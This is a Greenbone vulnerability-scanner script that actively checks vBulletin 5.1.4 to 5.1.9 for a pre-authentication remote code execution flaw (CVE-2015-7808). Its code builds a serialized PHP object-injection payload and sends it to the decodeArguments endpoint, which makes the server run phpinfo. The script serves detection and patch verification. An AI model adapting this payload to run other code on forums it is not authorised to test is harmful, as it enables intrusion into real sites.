# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:vbulletin:vbulletin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105447");
  script_version("2025-05-29T05:40:25+0000");
  script_cve_id("CVE-2015-7808");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-05-29 05:40:25 +0000 (Thu, 29 May 2025)");
  script_tag(name:"creation_date", value:"2015-11-10 18:30:30 +0100 (Tue, 10 Nov 2015)");
  script_name("vBulletin 5.1.4 - 5.1.9 PreAuth RCE Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_dependencies("vbulletin_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("vbulletin/http/detected");

  script_xref(name:"URL", value:"http://www.vbulletin.com/forum/forum/vbulletin-announcements/vbulletin-announcements_aa/4332166-security-patch-release-for-vbulletin-5-connect-versions-5-1-4-through-5-1-9");

  script_tag(name:"summary", value:"vBulletin is prone to a remote code execution (RCE)
  vulnerability because it fails to properly sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to inject and execute
  arbitrary code within the context of the affected application.");

  script_tag(name:"affected", value:"vBulletin versions 5.1.4, 5.1.5, 5.1.6, 5.1.7, 5.1.8 and 5.1.9
  are known to be affected.");

  script_tag(name:"solution", value:"Vendor has released security patches.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_active");

  exit(0);
}

include("url_func.inc");
include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

foreach db( make_list( "vB_Database_MySQLi", "vB_Database" ) ) {

  db_len = strlen( db );
  cmd = 'phpinfo';
  cmd_len = strlen( cmd );

  exp = 'O:12:"vB_dB_Result":2:{s:5:"*db";O:' + db_len  + ':"' + db  + '":1:{s:9:"functions";a:1:{s:11:"free_result";s:' + cmd_len  + ':"' + cmd + '";}}s:12:"*recordset";i:1;}';

  exp = urlencode( str:exp );
  exp = str_replace( string:exp, find:"*", replace:"%00%2a%00" );

  url = dir + "/ajax/api/hook/decodeArguments?arguments=" + exp;

  if( http_vuln_check( port:port, url:url, pattern:"<title>phpinfo\(\)</title>" ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
